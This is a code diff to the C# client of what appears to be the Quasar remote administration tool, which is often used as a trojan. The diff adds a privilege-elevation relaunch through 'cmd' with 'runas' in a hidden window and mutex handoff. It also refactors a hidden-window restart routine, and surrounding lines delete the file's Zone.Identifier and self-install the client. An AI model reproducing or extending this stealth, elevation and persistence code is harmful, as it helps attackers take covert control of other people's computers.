@@ -51,20 +51,20 @@ namespace Quasar.Client
 
         private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
-            if (e.IsTerminating)
-            {
-                string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
-                if (string.IsNullOrEmpty(batchFile)) return;
+            if (!e.IsTerminating)
+                return;
 
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = true,
-                    FileName = batchFile
-                };
-                Process.Start(startInfo);
-                Exit();
-            }
+            string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
+            if (string.IsNullOrEmpty(batchFile)) return;
+
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                UseShellExecute = true,
+                FileName = batchFile
+            };
+            Process.Start(startInfo);
+            Exit();
         }
 
         private static void Cleanup()
@@ -93,7 +93,35 @@ namespace Quasar.Client
 
             ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
-            
+
+            // Request elevation
+            if (Settings.REQUESTELEVATIONONEXECUTION && WindowsAccountHelper.GetAccountType() != "Admin")
+            {
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Verb = "runas",
+                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true
+                };
+
+                MutexHelper.CloseMutex();  // close the mutex so our new process will run
+                bool success = true;
+                try
+                {
+                    Process.Start(processStartInfo);
+                }
+                catch
+                {
+                    success = false;
+                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
+                }
+
+                if (success)
+                    ConnectClient.Exit();
+            }
+
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
             if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
@@ -141,12 +169,10 @@ namespace Quasar.Client
                 ConnectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                 return true;
             }
-            else
-            {
-                MutexHelper.CloseMutex();
-                ClientInstaller.Install(ConnectClient);
-                return false;
-            }
+
+            MutexHelper.CloseMutex();
+            ClientInstaller.Install(ConnectClient);
+            return false;
         }
     }
 }
